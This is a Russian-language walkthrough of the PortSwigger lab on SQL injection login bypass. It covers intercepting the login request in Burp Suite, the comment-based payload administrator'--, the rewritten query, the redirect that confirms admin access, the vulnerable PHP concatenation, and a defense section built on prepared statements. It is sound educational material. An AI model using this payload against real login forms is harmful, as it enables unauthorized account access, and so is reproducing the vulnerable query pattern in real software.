# 📘 PortSwigger Lab: SQL injection vulnerability allowing login bypass

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/lab-login-bypass

---

# 📑 Оглавление

- [🎯 Цель](#goal)
- [🧠 Идея атаки](#idea)
- [🏗 Как работает login](#how)
- [🔍 Шаг 1 — Перехват запроса](#step1)
- [🔍 Шаг 2 — Анализ SQL](#step2)
- [🔍 Шаг 3 — SQL Injection](#step3)
- [🔍 Шаг 4 — Login bypass](#step4)
- [💥 Почему атака сработала](#why)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Войти как `administrator` без знания пароля через SQL Injection.

---

<a id="idea"></a>

# 🧠 Идея атаки

Приложение вставляет ввод пользователя прямо в SQL-запрос.

Мы не подбираем пароль.  
Мы меняем SQL-логику так, чтобы проверка password перестала выполняться.

---

<a id="how"></a>

# 🏗 Как работает login

Backend вероятно делает запрос:

```sql
SELECT * FROM users WHERE username='administrator' AND password='secret'
```

Условие:

```sql
AND password='secret'
```

проверяет пароль.

Наша цель — убрать эту часть запроса.

---

<a id="step1"></a>

# 🔍 Шаг 1 — Перехват запроса

Перехватываем login request в Burp Suite:

```http
POST /login HTTP/2

username=administrator&password=test
```

Теперь можно изменять параметры вручную.

---

<a id="step2"></a>

# 🔍 Шаг 2 — Анализ SQL

Пользователь контролирует:

```sql
'administrator'
```

и

```sql
'test'
```

Если приложение не фильтрует символы:

```sql
'
--
```

мы можем изменить SQL syntax.

---

<a id="step3"></a>

# 🔍 Шаг 3 — SQL Injection

Используем payload:

```sql
administrator'-- 
```

SQL превращается в:

```sql
SELECT * FROM users WHERE username='administrator'-- ' AND password='test'
```

---

# Что произошло

```sql
--
```

закомментировал:

```sql
AND password='test'
```

В итоге остается только:

```sql
username='administrator'
```

Пароль больше не проверяется.

---

<a id="step4"></a>

# 🔍 Шаг 4 — Login bypass

После payload сервер отвечает:

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
```

Это означает:
- login успешен;
- SQL Injection сработала;
- мы вошли как administrator.

---

<a id="why"></a>

# 💥 Почему атака сработала

Потому что backend делал что-то вроде:

```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Пользователь смог:
- закрыть строку;
- добавить SQL comment;
- изменить WHERE logic.

---

<a id="defense"></a>

# 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Input Validation
- Password Hashing
- Least Privilege

Безопасный пример:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
```

---

<a id="checklist"></a>

# 🛠 Чеклист

- [ ] найден login request
- [ ] найден SQL Injection
- [ ] проверена comment syntax
- [ ] выполнен login bypass
- [ ] получен redirect
- [ ] получена admin session

---

# ⬆ Наверх

[Вернуться к началу](#top)
